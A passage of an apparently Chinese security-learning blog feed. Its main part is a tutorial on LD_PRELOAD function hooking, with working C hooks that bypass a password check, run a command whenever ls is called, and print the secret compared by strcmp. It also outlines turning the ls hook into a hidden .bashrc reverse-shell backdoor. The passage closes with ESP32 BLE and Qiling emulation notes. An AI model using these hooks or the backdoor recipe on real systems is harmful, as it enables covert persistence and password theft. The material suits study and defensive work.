库来开发的时候，编译会报如下的错误<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230815223954076.png"></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error </span>while detecting libraries included by C:\Users\TigerHu\Documents\Arduino\libraries\ArduinoBLE\src\utility\HCIUartTransport.cpp<br><br>警告： ArduinoBLE 库要求运行在 samd, megaavr, mbed, apollo3, mbed_nano, mbed_portenta, mbed_nicla 架构()，可能与你现在运行在 esp32 架构上的开发板()不兼容。<br><br></code></pre></td></tr></table></figure><p>解决3:  是因为ArduinoBLE库目前不支持esp32架构，该库只支持运行在指定的硬件平台（如<code>samd</code>、<code>megaavr</code>等）上，而ESP32开发板属于不支持的架构。<br>如果您想在 ESP32 上使用 BLE 功能，可以考虑使用其他适用于 ESP32 的 BLE 库，例如 ESP32 BLE Arduino 库或 NimBLE-Arduino 库。您可以通过 Arduino 库管理器在 Arduino IDE 中搜索并安装这些库。</p><h2 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/Naisu_kun/article/details/115958024">https://blog.csdn.net/Naisu_kun/article/details/115958024</a></p><p><a href="https://github.com/espressif/arduino-esp32/tree/master/libraries/BLE">https://github.com/espressif/arduino-esp32/tree/master/libraries/BLE</a><br>esp32 蓝牙API<br><a href="https://docs.espressif.com/projects/esp-idf/zh_CN/latest/esp32/api-reference/bluetooth/index.html">https://docs.espressif.com/projects/esp-idf/zh_CN/latest/esp32/api-reference/bluetooth/index.html</a><br>玩转esp32 + arduino 开发环境搭建<br><a href="https://blog.csdn.net/finedayforu/article/details/108464784">https://blog.csdn.net/finedayforu/article/details/108464784</a></p><p>视频教学<br>bilibili《# ESP32蓝牙开发及项目实战：BLE蓝牙键盘、蓝牙鼠标、蓝牙手机自》</p><p>轻松易懂 arduino 低功耗 BLE 蓝牙通信<br><a href="https://blog.csdn.net/tiandiren111/article/details/117829463">https://blog.csdn.net/tiandiren111/article/details/117829463</a></p><p>代码用到的库<br><a href="https://github.com/nkolban/ESP32_BLE_Arduino/blob/master/src/BLEServer.h">https://github.com/nkolban/ESP32_BLE_Arduino/blob/master/src/BLEServer.h</a></p><p><a href="https://github.com/nkolban/ESP32_BLE_Arduino/blob/master/src/BLEServer.h">https://github.com/nkolban/ESP32_BLE_Arduino/blob/master/src/BLEServer.h</a></p><p>蓝牙灯泡hack<br><a href="https://www.instructables.com/Reverse-Engineering-Smart-Bluetooth-Low-Energy-Dev/">https://www.instructables.com/Reverse-Engineering-Smart-Bluetooth-Low-Energy-Dev/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux 使用LD_PRELOAD 进行hook</title>
    <link href="/2023/12/18/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook/"/>
    <url>/2023/12/18/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook/</url>
    
    <content type="html"><![CDATA[<h1 id="使用LD-PRELOAD-进行hook"><a href="#使用LD-PRELOAD-进行hook" class="headerlink" title="使用LD_PRELOAD 进行hook"></a>使用LD_PRELOAD 进行hook</h1><p>本文介绍了LD_PRELOAD特性，以及它如何对动态链接的可执行文件进行逆向工程。这种技术允许你劫持函数&#x2F;注入代码来操纵程序流。</p><h2 id="0x01-什么是LD-PRELOAD"><a href="#0x01-什么是LD-PRELOAD" class="headerlink" title="0x01 什么是LD_PRELOAD"></a>0x01 什么是LD_PRELOAD</h2><p>LD_PRELOAD 是Linux系统的一个环境变量，它可以影响程序的运行时的链接，允许定义在程序运行前优先加载的动态链接库。</p><p>这个功能主要是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p><p>一方面，我们可以利用此功能来使用自己的或者更好的函数（不需要别人的源码）。</p><p>另一方面，我们也可以向别人的程序注入程序，从而达到特定的目的。</p><p>LD_PRELOAD用于动态库的加载，动态库加载的优先级最高，一般情况下，其加载顺序位</p><blockquote><p>LD_PRELOAD &gt; LD_LIBRARY_PATH &gt;  &#x2F;etc&#x2F;ld.so.cache &gt; &#x2F;lib &gt; &#x2F;usr&#x2F;lib</p></blockquote><p>程序中我们经常要调用一些外部的函数，以open() 和 execve()为例，如果我们自定义这两个函数，把它编译成动态库后，通过LD_PRELOAD加载，当程序中调用open函数时，调用的其实是我们自定义的函数。</p><p>Linux 用的都是glibc ，有一个叫libc.so.6库文件，这几乎是Linux 命令的动态链接库，其中也有标准C的各种函数</p><h2 id="0x02-什么是程序链接"><a href="#0x02-什么是程序链接" class="headerlink" title="0x02 什么是程序链接"></a>0x02 什么是程序链接</h2><p>程序的链接主要有以下三种：</p><ul><li>静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。</li><li>装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接</li><li>运行时动态链接：源程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。</li></ul><p>对于动态链接来说，需要动态链接库，起作用在于当动态库中的函数发生变化来说，对于可执行程序是透明的，可执行程序无需重新编译，方便程序的发布&#x2F;维护&#x2F;更新，但是由于程序是运行时动态加载，这就存在一个问题，假如程序动态加载的函数是恶意的，就有可能导致一些非预期的执行结果或者绕过某些安全设置。</p><h2 id="什么是HOOK"><a href="#什么是HOOK" class="headerlink" title="什么是HOOK"></a>什么是HOOK</h2><p>HOOK(钩子） 通过拦截函数调用，消息或软件组件之间传递的时间来改变或增强操作系统，应用程序或其他软件组件的行为</p><h3 id="HOOK-使用场景"><a href="#HOOK-使用场景" class="headerlink" title="HOOK 使用场景"></a>HOOK 使用场景</h3><h4 id="程序开发"><a href="#程序开发" class="headerlink" title="程序开发"></a>程序开发</h4><p>可以在程序开发的时候hook一些运行时的信息</p><h4 id="Windows-Linux-Mac-Hook"><a href="#Windows-Linux-Mac-Hook" class="headerlink" title="Windows&#x2F;Linux&#x2F;Mac Hook"></a>Windows&#x2F;Linux&#x2F;Mac Hook</h4><h4 id="Android-IOS-Hook"><a href="#Android-IOS-Hook" class="headerlink" title="Android&#x2F;IOS Hook"></a>Android&#x2F;IOS Hook</h4><p>在脱壳的时候都会使用Hook</p><hr><h2 id="title-使用LD-PRELOAD进行hook"><a href="#title-使用LD-PRELOAD进行hook" class="headerlink" title="title: 使用LD_PRELOAD进行hook"></a>title: 使用LD_PRELOAD进行hook</h2><h4 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h4><p>在固件模拟的时候在hook一些硬件需要的配置  </p><h2 id="0x03-LD-PRELOAD-进行HOOK"><a href="#0x03-LD-PRELOAD-进行HOOK" class="headerlink" title="0x03 LD_PRELOAD 进行HOOK"></a>0x03 LD_PRELOAD 进行HOOK</h2><p>由于LD_PRELOAD可以指定在程序运行前优先加载动态链接库，那我们可以重写程序运行过程中所调用的函数并编译成动态链接库文件，然后通过执行LD_PRELOAD让程序优先加载这个恶意的动态链接库，最后当程序再次运行时便会加载动态链接库中的恶意函数。具体操作步骤如下：</p><ol><li>定义与目标函数完全一样的函数，包括名称、变量及类型、返回值及类型等。</li><li>将包含替换函数的源码编译为动态链接库</li><li>通过命令 export LD_PRELOAD&#x3D;”库文件路径”，设置要优先替换动态链接库即可。</li><li>替换结束，要还原函数的调用关系，用命令uset LD_PRELOAD解除，或者 export LD_PRELOAD&#x3D;NULL 卸载库。</li></ol><p>使用LD_PRELOAD 进行hook 有个限制：只能hook 动态链接的库，对静态链接的库是无效的，因为静态链接的代码都写到可执行文件了。</p><blockquote><p>可以使用 man 命令查看函数原型和定义，比如 man  strcmp </p></blockquote><h2 id="0x04-hook-案例1"><a href="#0x04-hook-案例1" class="headerlink" title="0x04 hook 案例1"></a>0x04 hook 案例1</h2><p>passcheck.c ， 这里来hook strcmp 函数，绕过密码的验证。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> </span>&#123;<br>    <span class="hljs-type">char</span> passwd[] = <span class="hljs-string">&quot;password&quot;</span>;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usage: %s &lt;given-password&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(passwd, argv[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;32;32mPassword Correct!\n\033[m&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0;32;31mPassword Wrong!\n\033[m&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211126221603854.png" alt="image-20211126221603854"></p><p>上面的代码使用到了标准C函数strcmp函数来进行比较，这是一个外部函数。下面来尝试一下重新编写一个strcmp同名的函数，并编译成动态链接库，实现劫持原函数的功能。</p><p>hook_strcmp.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">strcmp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s2)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">gcc -<span class="hljs-keyword">shared</span> -fPIC hook_strcmp.c -o hook_strcmp.so<br></code></pre></td></tr></table></figure><h3 id="问题1（已解决）"><a href="#问题1（已解决）" class="headerlink" title="问题1（已解决）"></a>问题1（已解决）</h3><p>运行时出现如下错误，看样子是编译的问题。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">tigerortiger@ubuntu ~/t/learn_LD_PRELOAD&gt; LD_PRELOAD=/hook_strcmp.so ./passcheck paa<br><span class="hljs-keyword">ERROR: </span>ld.so: object &#x27;/hook_strcmp.so&#x27; from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.<br>Password Wrong!<br></code></pre></td></tr></table></figure><p>但是使用export LD_PRELOAD&#x3D;”hook_strcmp.so”可以成功hook</p><p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211126223530371.png" alt="image-20211126223530371"></p><p>解决方案，可能是没有加载到库，路径错误。</p><p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211126224044388.png" alt="image-20211126224044388"></p><h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><p>不理解编译的时候为什么加-share  -fPIC<br>在编译动态链接库时使用 -shared 参数可以告诉编译器生成动态链接库，而使用 -fPIC 参数则是为了生成位置无关的代码。这意味着编译出的目标文件中的函数和数据的地址都相对独立于加载它们的位置，这使得动态链接库可以被加载到任意内存地址上，而不会由于地址冲突而导致问题。因此，在编译动态链接库时，通常需要同时使用 -shared 和 -fPIC 参数。</p><h2 id="0x05-hook案例2-修改系统命令"><a href="#0x05-hook案例2-修改系统命令" class="headerlink" title="0x05 hook案例2 修改系统命令"></a>0x05 hook案例2 修改系统命令</h2><p>查看 ls 系统命令会调用那些库函数：</p><blockquote><p>查看二进制文件会调用那些库文件是使用 readelf</p><p>或者使用 ltrace 来查看调用库函数（待验证）</p></blockquote><p><strong>ltrace 的作用</strong></p><p>ltrace 的功能是能够跟踪进程的库函数调用，首先ltrace打开elf文件，对其进行分析。在elf文件中，出于动态连接的需要，需要在elf文件中保存函数的符号，供连接器使用。</p><p>ltrace 就能够获得该文件中，所有系统调用的符号，以及对应的执行指令。</p><p><strong>ldd 的作用</strong></p><p>用于打印程序或者文件所依赖的共享库列表</p><p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211130220612840.png" alt="image-20211130220612840"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">readelf -Ws <span class="hljs-regexp">/usr/</span>bin/ls<br></code></pre></td></tr></table></figure><p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211126225301655.png" alt="image-20211126225301655"></p><p>编写hook_strncmp.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;id&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">strncmp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__s2, <span class="hljs-type">size_t</span> __n)</span> </span>&#123;    <span class="hljs-comment">// 这里函数的定义可以根据报错信息进行确定</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    <span class="hljs-built_in">payload</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>编译的源代码strncmp函数我故意少了个形参，就会出现如下错误，大概的意思是命名的函数的参数与string.h中定义的函数的参数保持一致</p><p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211126230354134.png" alt="image-20211126230354134"></p><p>成功劫持了strncpy函数，并且改变了ls命令执行。</p><p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211126231104066.png" alt="image-20211126231104066"></p><h2 id="0x06-hook-案例3-制作系统后门"><a href="#0x06-hook-案例3-制作系统后门" class="headerlink" title="0x06 hook 案例3 制作系统后门"></a>0x06 hook 案例3 制作系统后门</h2><p>制作一个隐藏的Linux 后门，当管理员执行 上面的 ls 命令时反弹shell。</p><p>只需要改上面的hook_strncmp.c 文件，只需要更改payload()函数中的system 函数。</p><p>然后在 .bashrc 中写入 “ export LD_PRELOAD&#x3D;&#x2F;root&#x2F;hook_strncmp.so”</p><p>在执行的时候就可以反弹shell。</p><h2 id="0x07-hook-案例4"><a href="#0x07-hook-案例4" class="headerlink" title="0x07 hook 案例4"></a>0x07 hook 案例4</h2><p><strong>typedef 的用法</strong></p><p>本次hook 的用法是使用typedef 给函数指针类型定义一个别名。</p><p><strong>dlopen() 的作用</strong></p><p>dlopen 是一个库函数，该函数会打开一个新库，并把它装入内存。该函数主要用来加载库中的符号。</p><p>dlopen 以指定模式打开指定的动态链接库文件，并返回一个句柄给调用的进程，dlsym通过句柄和连接符名称获取函数名或者变量名</p><p><em>dlopen打开模式如下：</em></p><p>​RTLD_LAZY暂缓决定，等有需要时再解出符号<br>​RTLD_NOW 立即决定，返回前解除所有未决定的符号。</p><p>dlopen() 在dlfcn.h 中定义，并在dl库中实现。它需要两个参数：一个文件名和一个标志。</p><p>当库被装入后，可以把dlopen() 返回的句柄作为给 dlsym() 的第一个参数，以获得符号在库中的地址，使用这个地址，就可以获得库中特定函数的指针，并调用装载库中的相应函数。</p><p>编译的时候要加入 -ldl (指定 dl  库)</p><p><strong>dlsym() 函数作用</strong></p><p>dlsym() 的函数原型是</p><p>void *dlsym(void *handle, const chat *symbol)</p><p>handle 是由dlopen 打开动态链接库后返回的指针；symbol 就是要获取的函数的名称；函数返回值是 void* , 指向要获取的函数的地址，供调用使用。</p><p>这个案例还是hook 案例1 的 passcheck.c </p><p>因为 hook 的目标是拿到strcmp，所以typedef 了一个STRCMP函数指针。由于hook的目的是要控制函数行为，所以需要从原库libc.so.6 中拿到“正版” strcmp指针，保存成old_strcmp以备调用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br><br><span class="hljs-comment">// hook_strncmp_1.c</span><br><span class="hljs-comment">// 使用typedef 给函数指针类型一个别名，</span><br><span class="hljs-comment">// tpyedef 没有定义新的类型，给已经有的类型起一个别名，减少输入。</span><br><span class="hljs-comment">// * 类型，STRCMP 存储函数地址</span><br><span class="hljs-comment">// 定义 STRCMP 函数指针</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span><span class="hljs-params">(*STRCMP)</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>*,<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)</span></span>; <br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">strcmp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s1,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s2)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *handle = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">// 创建函数指针</span><br><span class="hljs-type">static</span> STRCMP old_strcmp = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span>(!handle)<br>&#123;<br><span class="hljs-comment">// 打开动态链接库</span><br>handle = <span class="hljs-built_in">dlopen</span>(<span class="hljs-string">&quot;libc.so.6&quot;</span>,RTLD_LAZY);<br><span class="hljs-comment">// 获取libc.so.6 库中strcmp 函数的地址</span><br>old_strcmp = (STRCMP)<span class="hljs-built_in">dlsym</span>(handle,<span class="hljs-string">&quot;strcmp&quot;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;\n&quot;</span>,s1,s2);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">old_strcmp</span>(s1,s2);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译函数源程序时选用-shared 选项即可创建动态链接库，注意应以 .so 后缀命名，最好放到公用库目录（如&#x2F;lib，&#x2F;usr&#x2F;lib 等）下面，并要写好用户接口文件，以便其他用户共享。</p><p>使用动态链接库，源程序中要包含 dlfcn.h 头文件，写程序时注意 dlopen 等函数的正确调用，编译时要采用 -rdynamic 选项与 -ldl 选项，以产生可调用动态链接库的执行代码。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">gcc -fPIC -shared -o hook_str<span class="hljs-symbol">ncmp_1</span>.so hook_str<span class="hljs-symbol">ncmp_1</span>.c -ldl<br></code></pre></td></tr></table></figure><p>我们hook 的函数可以将正确的登录口令打印出来。</p><p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211201220448721.png" alt="image-20211201220448721"></p><h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>使用LD_PREOAD 进行hook 可以很好的控制程序的流程，以达到自己想要的结果，另外在物联网设备固件模拟或者某些特殊服务模拟的时候，能起到非常至关重要的效果，比如模拟路由器中的http服务时，会缺少nvram的相关配置的设置，这个时候就可以使用LD_PRELOAD对相关配置进行hook 。</p><h2 id="0x08-hook-总结"><a href="#0x08-hook-总结" class="headerlink" title="0x08 hook 总结"></a>0x08 hook 总结</h2><ol><li>定义与目标函数完全一样的函数，包括名称、变量及类型、返回值及类型等</li><li>将包含替换函数的源码编译为动态链接库</li><li>通过命令 <code>export LD_PRELOAD=&quot;库文件路径&quot;</code>，设置要优先替换动态链接库</li><li>如果找不替换库，可以通过 <code>export LD_LIBRARY_PATH=库文件所在目录路径</code>，设置系统查找库的目录</li><li>替换结束，要还原函数调用关系，用命令<code>unset LD_PRELOAD</code> 解除</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>expoit LD_PRELOAD 的逆向工程讲解，很受用</p><p><a href="https://www.exploit-db.com/papers/13233">https://www.exploit-db.com/papers/13233</a></p><p>LD_PRELOAD 后门 | Linux 后门系列（这个作者的一系列后门文章都值得看）</p><p><a href="https://cloud.tencent.com/developer/article/1683272">https://cloud.tencent.com/developer/article/1683272</a></p><p>有趣的 LD_PRELOAD</p><p><a href="https://www.anquanke.com/post/id/254388#h2-11">https://www.anquanke.com/post/id/254388#h2-11</a></p><p>C 语言定义函数指针（typedef）</p><p><a href="https://blog.csdn.net/xiezhi123456/article/details/80630705">https://blog.csdn.net/xiezhi123456/article/details/80630705</a></p><p>动态链接库dlopen 函数的使用</p><p><a href="https://blog.csdn.net/A493203176/article/details/78792274">https://blog.csdn.net/A493203176/article/details/78792274</a></p><p>LD_PRELOAD 程序编译的路程图和试验。</p><p><a href="https://blog.csdn.net/chen_jianjian/article/details/80627693">https://blog.csdn.net/chen_jianjian/article/details/80627693</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>QiLing 框架学习WriteUp</title>
    <link href="/2023/12/18/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/12/18/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="QiLing-框架学习"><a href="#QiLing-框架学习" class="headerlink" title="QiLing 框架学习"></a>QiLing 框架学习</h1><h3 id="Qiling"><a href="#Qiling" class="headerlink" title="Qiling"></a>Qiling</h3><p>Qiling 是一个高级二进制仿真框架，是基于Unicorn（独角兽）具有以下特点：</p><ul><li>跨平台：Windows、MacOS、Linux、BSD、UEFI、DOS</li><li>跨架构：X86、X86_64、Arm、Arm64、MIPS、8086</li><li>多种文件格式：PE、MachO、ELF、COM</li><li><a href="https://groundx.io/demigod/">通过Demigod</a>支持 Linux Kernel Module(.ko)、Windows Driver(.sys) 和 MacOS Kernel(.kext)</li><li>在隔离环境中模拟和沙箱机器代码</li><li>支持跨架构和平台调试功能</li><li>提供高级 API 来设置和配置沙箱</li><li>细粒度检测：允许不同级别的钩子（指令&#x2F;基本块&#x2F;内存访问&#x2F;异常&#x2F;系统调用&#x2F;IO&#x2F;等）</li><li>允许动态热补丁运行代码，包括加载的库</li><li>真正的 Python 框架，可以轻松地在上面构建自定义的安全分析工具</li></ul><h4 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h4><p>新建一个ubuntu 18.04 的虚拟机。伊万说这个东西会改变其他的环境配置</p><p><strong>自动安装</strong> ，这种安装方式失败</p><p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220412185946587.png" alt="image-20220412185946587"></p><p><strong>手动安装</strong> ， </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">安装方式  Ubuntu <span class="hljs-number">20.04</span><br>sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br>sudo apt-<span class="hljs-built_in">get</span> upgrade<br>sudo apt install <span class="hljs-keyword">python3</span>-pip git cmake<br>git clone -<span class="hljs-keyword">b</span> dev https://github.<span class="hljs-keyword">com</span>/qilingframework/qiling.git<br><span class="hljs-keyword">cd</span> qiling &amp;&amp; git submodule <span class="hljs-keyword">update</span> --init --recursive<br>sudo pip3 install . <br><br><br></code></pre></td></tr></table></figure><h3 id="基础语法和函数"><a href="#基础语法和函数" class="headerlink" title="基础语法和函数"></a>基础语法和函数</h3><p>开发文档</p><p>ql.verbose &#x3D; 0 </p><p>查看输出，不带寄存器、汇编指令的输出。</p><p>内存映射</p><p>在写入内存之前进行内存映射</p><blockquote><p>ql.mem.map(addr,size,info &#x3D; [my_first_map])</p><p>addr 要注意内存偏移量和映射地址</p><p>size :  应该映射的内存大小，如果使用linux 系统，至少需要考虑4096的倍数进行对齐。</p></blockquote><p>ql.loader.elf_entry  获取程序入口的地址</p><p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220426181633377.png" alt="image-20220426181633377"></p><p>ql.loader.load_address  获取加载基地址  </p><p>ql.men.get_lib_base(“httpd”)  和 ql.loader.load_address 获取的值是一样的。</p><p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220426182018533.png" alt="image-20220426182018533"></p><p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220426183049546.png" alt="image-20220426183049546"></p><p>ql.os.set_api(‘sleep’,fake_sleep)  hook 某个函数</p><p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220426182136100.png" alt="image-20220426182136100"></p><p>ql.arch.regs.r0 &#x3D;1 设置寄存器r0 的值</p><p>ql.arch.regs.read(‘r0’) 获取寄存器r0 中的值</p><p>ql.mem.show_mapinfo() 显示映射信息</p><p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220426182517111.png" alt="image-20220426182517111"></p><p><img 